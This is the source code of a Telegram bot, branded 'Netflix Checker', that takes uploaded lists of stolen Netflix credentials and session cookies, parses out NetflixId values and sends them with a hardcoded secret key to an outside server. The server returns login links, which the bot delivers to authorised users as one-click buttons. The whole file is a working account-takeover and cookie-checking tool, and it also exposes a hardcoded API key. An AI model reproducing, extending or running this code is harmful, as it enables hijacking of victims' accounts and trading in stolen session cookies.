import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json
import urllib.parse
import sys

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://104.223.121.139:6969/api/gen"  # YOUR API
SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"  # YOUR SECRET KEY

# YOUR CREDIT - Changed to your cool name
YOUR_CREDIT = "LIM 🚀"

# ==================== AUTHORIZED USERS ====================
AUTHORIZED_USERS = [1058484190, 6247762383]  # Only these users can use the bot

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== MULTI-LANGUAGE SUPPORT ====================

LANGUAGES = {
    'en': {
        'name': 'English',
        'flag': '🇺🇸',
        'welcome': 'Welcome',
        'start': 'Start',
        'help': 'Help',
        'stats': 'Statistics',
        'clear': 'Clear',
        'language': 'Language',
        'processing': 'Processing',
        'valid': '✅ NETFLIX ACCOUNT',
        'invalid': '❌ NOT WORKING',
        'email': 'Email',
        'password': 'Password',
        'country': 'Country',
        'phone': 'Phone',
        'plan': 'Plan',
        'quality': 'Quality',
        'streams': 'Max Streams',
        'login_link': 'Login Link',
        'launch': '🎬 OPEN NETFLIX',
        'powered_by': 'Powered by',
        'file_received': '📁 FILE RECEIVED',
        'analyzing': '🔍 ANALYZING',
        'complete': '✨ COMPLETE',
        'results': 'RESULTS',
        'valid_found': 'Working Accounts',
        'invalid_found': 'Not Working',
        'success_rate': 'Success Rate',
        'no_valid': 'No working accounts found',
        'error_occurred': '⚠️ Error',
        'rate_limit': 'Please wait a moment',
        'wrong_format': 'Please upload a .txt file',
        'member_since': 'Member Since',
        'payment_method': 'Payment',
        'next_billing': 'Next Billing',
        'extra_member': 'Extra Member',
        'check_command': 'Check Netflix',
        'enter_cookie': 'Please enter your Netflix code',
        'checking': '⏳ Checking...',
        'cookie_valid': '✅ NETFLIX ACCOUNT',
        'cookie_invalid': '❌ INVALID',
        'how_to_use': 'HOW TO USE',
        'instruction': '👇 Click the button below to open Netflix',
        'unauthorized': '⛔ Access Denied',
        'no_permission': 'You are not authorized to use this bot.',
        'click_to_open': '🎬 OPEN NETFLIX',
        'your_code': 'Code',
        'simple_instruction': 'Click the button below to start watching',
        'valid_message': 'Here is your Netflix Account',
        'invalid_message': 'This Netflix code is not working anymore',
        'link_label': 'Login Link',
        'credit_line': 'LIM 🚀',
    }
}

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== AUTO DELETE COMMAND FUNCTION ====================

async def delete_user_command(context: ContextTypes.DEFAULT_TYPE):
    """Delete the user's command message after delay"""
    job = context.job
    if job and job.data:
        try:
            await context.bot.delete_message(chat_id=job.chat_id, message_id=job.data)
            logger.info(f"✅ Deleted command message {job.data}")
        except Exception as e:
            logger.error(f"Failed to delete command: {e}")

def schedule_command_deletion(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 3):
    """Schedule the user's command message for deletion"""
    try:
        if context.job_queue:
            context.job_queue.run_once(
                delete_user_command,
                delay,
                data=message_id,
                chat_id=chat_id,
                name=f"delete_cmd_{message_id}"
            )
    except Exception as e:
        logger.error(f"Error scheduling deletion: {e}")

# ==================== AUTHORIZATION DECORATOR ====================

def authorized_only(func):
    """Decorator to restrict access to authorized users only"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update or not update.effective_user:
            return
            
        user_id = update.effective_user.id
        
        if user_id not in AUTHORIZED_USERS:
            await update.message.reply_text(
                f"**⛔ Access Denied**\n\nYou are not authorized to use this bot.",
                parse_mode='Markdown'
            )
            return
        
        return await func(update, context, *args, **kwargs)
    return wrapper

# ==================== NETFLIX ID EXTRACTOR ====================

def extract_netflix_id_from_cookie(cookie_text):
    """Extract NetflixId from various cookie formats"""
    if not cookie_text:
        return None
    
    patterns = [
        r'NetflixId=([^&\s]+)',
        r'netflixid=([^&\s]+)',
        r'NetflixId%3D([^&\s]+)',
        r'netflixid%3D([^&\s]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, cookie_text, re.IGNORECASE)
        if match:
            netflix_id = match.group(1).strip()
            return netflix_id
    
    return cookie_text

# ==================== ENHANCED FORMAT PARSER ====================

def parse_account_line(line):
    """Parse a single line in either format"""
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        parts = line.split('|', 1)
        first_part = parts[0].strip()
        
        if ':' in first_part:
            email_pass = first_part.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        else:
            email_pass_match = re.search(r'([^\s:]+):([^\s|]+)', first_part)
            if email_pass_match:
                account['email'] = email_pass_match.group(1).strip()
                account['password'] = email_pass_match.group(2).strip()
        
        if len(parts) > 1:
            remaining = parts[1]
            
            if '=' in remaining and ':' not in remaining:
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if '=' in field:
                        key, value = field.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        
                        key_lower = key.lower()
                        
                        if 'phonenumber' in key_lower or 'phone' in key_lower:
                            account['phone'] = value
                        elif 'country' in key_lower:
                            account['country'] = value
                        elif 'plan' in key_lower:
                            account['plan'] = value
                        elif 'videoquality' in key_lower or 'quality' in key_lower:
                            account['quality'] = value
                        elif 'maxstreams' in key_lower or 'streams' in key_lower:
                            account['streams'] = value
                        elif 'netflixcookies' in key_lower or 'cookie' in key_lower or 'netflixid' in key_lower:
                            account['full_cookie'] = value
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
                        elif 'membersince' in key_lower:
                            account['member_since'] = value
                        elif 'paymentmethod' in key_lower:
                            account['payment_method'] = value
            
            else:
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if ':' in field:
                        key, value = field.split(':', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if 'phone' in key:
                            account['phone'] = value
                        elif 'country' in key:
                            account['country'] = value
                        elif 'cookie' in key:
                            account['full_cookie'] = value
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
        
        if 'netflix_id' not in account:
            netflix_id = extract_netflix_id_from_cookie(line)
            if netflix_id:
                account['netflix_id'] = netflix_id
                if 'email' not in account:
                    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
                    if email_match:
                        account['email'] = email_match.group(1)
        
        if 'netflix_id' not in account:
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
            account['password'] = "••••••••"
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== UPDATED API FUNCTIONS WITH MOBILE SUPPORT ====================

async def check_with_your_api(netflix_id, email="unknown@email.com"):
    """Check Netflix ID using YOUR API - Now returns both PC and Phone URLs"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "error_code": "MISSING_NETFLIX_ID",
            "email": email
        }
    
    try:
        url = "http://104.223.121.139:6969/api/gen"
        
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling API for {email}")
        
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        if result.get('success'):
            login_url = result.get('login_url')
            phone_url = result.get('phone_url')  # New field for phone URL
            
            if login_url:
                return {
                    "success": True,
                    "login_url": login_url,
                    "phone_url": phone_url,  # Add phone URL
                    "email": email,
                }
            else:
                return {
                    "success": False,
                    "error": "No login URL generated",
                    "error_code": "MISSING_URL",
                    "email": email
                }
        else:
            error_msg = result.get('error', 'Invalid or expired')
            return {
                "success": False,
                "error": error_msg,
                "error_code": result.get('error_code', 'INVALID'),
                "email": email
            }
                
    except Exception as e:
        logger.error(f"Error checking Netflix ID: {e}")
        return {
            "success": False,
            "error": "Service unavailable",
            "error_code": "ERROR",
            "email": email
        }

# ==================== LANGUAGE SELECTION ====================

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show language selection menu"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    keyboard = [
        [
            InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌐 **Select your language**",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.callback_query.answer("⛔ Unauthorized")
        return
    
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    lang_code = query.data.replace('lang_', '')
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['language'] = lang_code
    
    lang = LANGUAGES[lang_code]
    
    await query.edit_message_text(
        f"✅ **{lang['flag']} {lang['name']} selected**",
        parse_mode='Markdown'
    )

def get_lang(user_id):
    """Get user's selected language"""
    if user_id in user_sessions and 'language' in user_sessions[user_id]:
        return user_sessions[user_id]['language']
    return 'en'

# ==================== BOT COMMANDS ====================

@authorized_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    user = update.effective_user
    user_id = user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    welcome = f"""
╔══════════════════════════════════════╗
║        🎬 **NETFLIX CHECKER** 🎬      ║
╚══════════════════════════════════════╝

👋 **Welcome {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send a .txt file** with accounts
🔍 **Or use /check** for single code

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Use /help for instructions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

@authorized_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    help_text = f"""
╔══════════════════════════════════════╗
║          🆘 **HELP** 🆘               ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **Upload File:**
Send a .txt file with accounts

🔍 **Single Check:**
`/check YOUR_NETFLIX_ID`

Example:
`/check v%3D3%26ct%3DBgjH...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

@authorized_only
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔══════════════════════════════════════╗
║         📊 **STATS** 📊               ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid:** `{valid_accounts}`
❌ **Invalid:** `{invalid_accounts}`
📈 **Success:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

@authorized_only
async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        lang_pref = user_sessions[user_id].get('language', 'en')
        user_sessions[user_id] = {'language': lang_pref}
    
    await update.message.reply_text(
        f"✅ **Ready!**\n\nYou can upload a new file.",
        parse_mode='Markdown'
    )

# ==================== UPDATED CHECK COMMAND WITH MOBILE SUPPORT ====================

@authorized_only
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single Netflix ID - Now with mobile support"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **Please wait a moment**",
            parse_mode='Markdown'
        )
        return
    
    if not context.args:
        error_msg = f"""
╔══════════════════════════════════════╗
║        ❓ **HOW TO USE** ❓            ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 Type: `/check` followed by your code

Example:
`/check v%3D3%26ct%3DBgjH...`
        """
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        return
    
    user_input = ' '.join(context.args)
    
    if 'NetflixId=' in user_input or 'netflixid=' in user_input:
        match = re.search(r'NetflixId=([^\s]+)', user_input, re.IGNORECASE)
        netflix_id = match.group(1) if match else user_input
    else:
        netflix_id = user_input
    
    netflix_id = netflix_id.strip('"\'')
    
    checking_msg = await update.message.reply_text(
        f"**⏳ Checking...** 🔍",
        parse_mode='Markdown'
    )
    
    result = await check_with_your_api(netflix_id, f"manual_{netflix_id[:8]}")
    
    total_checks += 1
    
    try:
        await checking_msg.delete()
    except:
        pass
    
    if result.get('success'):
        valid_accounts += 1
        
        short_id = netflix_id[:15] + "..." if len(netflix_id) > 15 else netflix_id
        
        # Get phone URL (fallback to PC URL if not available)
        phone_url = result.get('phone_url', result['login_url'])
        
        # Updated success message with both options
        success_msg = f"""
╔══════════════════════════════════════╗
║     ✅ **NETFLIX ACCOUNT** ✅        ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 **Code:** `{short_id}`

📱 **Phone Login URL:**
`{phone_url}`

💻 **PC Login URL:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👇 Click the buttons below to open

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
        """
        
        # Create buttons for both platforms
        keyboard = [
            [InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)],
            [InlineKeyboardButton("💻 OPEN ON PC", url=result['login_url'])]
        ]
        
        await update.message.reply_text(
            success_msg,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
            
    else:
        invalid_accounts += 1
        
        short_id = netflix_id[:15] + "..." if len(netflix_id) > 15 else netflix_id
        
        error_msg = f"""
╔══════════════════════════════════════╗
║     ❌ **INVALID CODE** ❌           ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 **Code:** `{short_id}`

❌ This Netflix code is not working

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try another code

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
        """
        
        await update.message.reply_text(error_msg, parse_mode='Markdown')

# ==================== UPDATED FILE HANDLER WITH MOBILE SUPPORT ====================

@authorized_only
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files - Now with mobile support"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **Please wait a moment**",
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"❌ **Please upload a .txt file**",
            parse_mode='Markdown'
        )
        return
    
    progress_msg = await update.message.reply_text(
        f"**📁 FILE RECEIVED**\n⏳ **Processing...**",
        parse_mode='Markdown'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await progress_msg.edit_text(
            f"**🔍 ANALYZING**\n🔍 Found: `{len(accounts)}` accounts",
            parse_mode='Markdown'
        )
        
        valid_count = 0
        invalid_count = 0
        
        for i, line in enumerate(accounts, 1):
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                continue
            
            if i % 3 == 0 or i == len(accounts):
                await progress_msg.edit_text(
                    f"**⏳ Processing**\n📊 `{i}/{len(accounts)}`\n✅ `{valid_count}` ❌ `{invalid_count}`",
                    parse_mode='Markdown'
                )
            
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                details = []
                if account.get('country'):
                    details.append(f"🌍 {account['country']}")
                if account.get('plan'):
                    details.append(f"📺 {account['plan']}")
                
                details_str = ' | '.join(details) if details else ''
                
                # Get phone URL (fallback to PC URL if not available)
                phone_url = result.get('phone_url', result['login_url'])
                
                # Updated valid message with both options
                valid_msg = f"""
╔══════════════════════════════════════╗
║     ✅ **NETFLIX ACCOUNT** ✅        ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** `{account['email']}`
{details_str}

📱 **Phone URL:**
`{phone_url}`

💻 **PC URL:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👇 Click the buttons below to open
                """
                
                # Create buttons for both platforms
                keyboard = [
                    [InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)],
                    [InlineKeyboardButton("💻 OPEN ON PC", url=result['login_url'])]
                ]
                
                await update.message.reply_text(
                    valid_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            await asyncio.sleep(0.5)
        
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        if valid_count > 0:
            summary = f"""
╔══════════════════════════════════════╗
║         **✨ COMPLETE** ✨            ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Working:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
📈 **Success:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
            """
        else:
            summary = f"""
╔══════════════════════════════════════╗
║        **❌ NO WORKING** ❌          ║
╚══════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **Invalid:** `{invalid_count}`

💡 No working accounts found

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ {YOUR_CREDIT} ✨
            """
        
        await progress_msg.edit_text(summary, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await progress_msg.edit_text(
            f"**⚠️ Error**\n💡 Please try again",
            parse_mode='Markdown'
        )

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 50)
    print("🎬 NETFLIX CHECKER BOT WITH MOBILE SUPPORT")
    print("=" * 50)
    print(f"✅ Authorized Users: {len(AUTHORIZED_USERS)}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print(f"✅ Mobile Support: Enabled")
    print("=" * 50)
    
    clear_telegram_webhook()
    
    app = Application.builder().token(TOKEN).build()
    
    if app.job_queue:
        print("✅ JobQueue initialized")
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    
    await app.updater.start_polling(
        drop_pending_updates=True,
        allowed_updates=['message', 'callback_query']
    )
    
    print("✅ Bot is running with Mobile Support!")
    print("=" * 50)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
